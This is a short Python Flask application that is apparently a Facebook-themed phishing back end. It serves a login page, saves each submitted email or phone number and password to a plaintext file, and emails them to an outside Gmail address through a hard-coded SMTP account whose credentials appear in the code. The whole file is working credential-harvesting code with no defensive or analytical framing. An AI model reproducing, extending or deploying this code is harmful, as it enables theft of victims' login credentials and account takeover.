from flask import Flask, render_template, request
import smtplib
from email.mime.text import MIMEText

app = Flask(__name__)

def send_email(email, password):
    # Replace these values with the actual email account settings
    sender_email = 'facebook@icontinum.co.za'
    sender_password = 'facEbook@2023'

    subject = 'Login Attempt'
    body = f"Email or Phone: {email} | Password: {password}"

    message = MIMEText(body)
    message['Subject'] = subject
    message['From'] = sender_email
    message['To'] = 'businessesiconnect@gmail.com'  # Replace with the recipient's email

    with smtplib.SMTP('mail.icontinum.co.za', 587) as server:
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, 'businessesiconnect@gmail.com', message.as_string())

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']

        # Validate and sanitize input before sending the email
        email = email.strip()
        password = password.strip()

        # Store data in a text file (for demonstration purposes only)
        with open('user_data.txt', 'a') as file:
            file.write(f"Email or Phone: {email} | Password: {password}\n")

        # Send email notification
        send_email(email, password)

    return render_template('login.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3000, debug=True)
